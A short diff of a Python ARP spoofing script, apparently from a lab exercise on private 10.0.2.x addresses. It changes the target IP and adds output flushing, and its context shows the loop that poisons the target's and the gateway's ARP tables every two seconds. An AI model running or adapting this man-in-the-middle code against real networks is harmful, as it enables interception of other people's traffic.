@@ -42,7 +42,7 @@ def restore(destination_ip, source_ip):
 
 # restore("10.0.2.15", "10.0.2.1")
 
-target_ip = "10.0.2.15"
+target_ip = "10.0.2.6"
 gateway_ip = "10.0.2.1"
 
 try:
@@ -52,6 +52,7 @@ try:
         spoof(gateway_ip, target_ip)
         sent_packets_count += 2
         print("\r[+] Send two packets " + str(sent_packets_count), end="")
+        sys.stdout.flush()
         time.sleep(2)
 except KeyboardInterrupt:
     print("[+] Detected Ctrl + C ..... Reseting ARP tables .... Please wait.\n")
